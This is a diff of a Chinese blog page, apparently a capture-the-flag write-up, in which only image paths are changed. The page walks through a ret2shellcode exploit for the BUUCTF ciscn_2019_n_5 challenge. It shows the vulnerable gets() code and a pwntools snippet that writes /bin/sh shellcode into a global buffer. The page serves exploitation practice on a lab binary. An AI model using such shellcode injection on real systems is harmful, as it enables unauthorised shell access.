@@ -23,15 +23,15 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="ret2shellcode练习例题：BUUCTF ciscn_2019_n_5 题目分析 查看题目信息，64位，没有开启任何保护。 拖到ida里，只有一个关键函数main函数： 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  char text[30]; &#x2F;&#x2F; [rsp+0">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/.com//check.png">
-<meta property="og:image" content="http://example.com/.com//nc.png">
-<meta property="og:image" content="http://example.com/.com//name.png">
-<meta property="og:image" content="http://example.com/.com//text.png">
+<meta property="og:image" content="http://example.com/images/check.png">
+<meta property="og:image" content="http://example.com/images/nc.png">
+<meta property="og:image" content="http://example.com/images/name.png">
+<meta property="og:image" content="http://example.com/images/text.png">
 <meta property="article:published_time" content="2023-09-14T07:44:33.000Z">
-<meta property="article:modified_time" content="2023-09-14T07:53:20.843Z">
+<meta property="article:modified_time" content="2023-09-14T08:04:14.132Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/.com//check.png">
+<meta name="twitter:image" content="http://example.com/images/check.png">
   
   
   
@@ -278,17 +278,17 @@
               <div class="markdown-body">
                 
                 <h2 id="ret2shellcode练习"><a href="#ret2shellcode练习" class="headerlink" title="ret2shellcode练习"></a>ret2shellcode练习</h2><p><strong>例题：BUUCTF ciscn_2019_n_5</strong></p>
-<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="/.com//check.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="/images/check.png" srcset="/img/loading.gif" lazyload></p>
 <p>查看题目信息，64位，没有开启任何保护。</p>
 <p>拖到ida里，只有一个关键函数main函数：</p>
 <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> text[<span class="hljs-number">30</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;tell me your name&quot;</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, name, <span class="hljs-number">0x64</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;wow~ nice name!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What do you want to say to me?&quot;</span>);<br>  <span class="hljs-built_in">gets</span>(text);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>并且没有发现system和&#x2F;bin&#x2F;sh。</p>
 <p>nc查看一下程序，有两个输入点，第一次让我们输入名字，限制输入长度为0x64，看一下name参数，发现name在全局变量bss段上</p>
-<p><img src="/.com//nc.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/.com//name.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/nc.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/name.png" srcset="/img/loading.gif" lazyload></p>
 <p>第二次输入利用gets，没有限制长度，可以对v4造成溢出。</p>
-<p><img src="/.com//text.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/text.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>1.利用第一个输入点，往name参数里写入shellcode</strong></p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">context</span><span class="hljs-params">(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)</span></span>                   #用来导入pwntools模块<br>shellcode=<span class="hljs-built_in">asm</span>(shellcraft<span class="hljs-selector-class">.sh</span>())                     #利用pwntools模块自动生成shellcode<br>r<span class="hljs-selector-class">.sendlineafter</span>(<span class="hljs-string">&#x27;tell me your name&#x27;</span>,shellcode)     #往name中写入shellcode<br></code></pre></td></tr></table></figure>
 
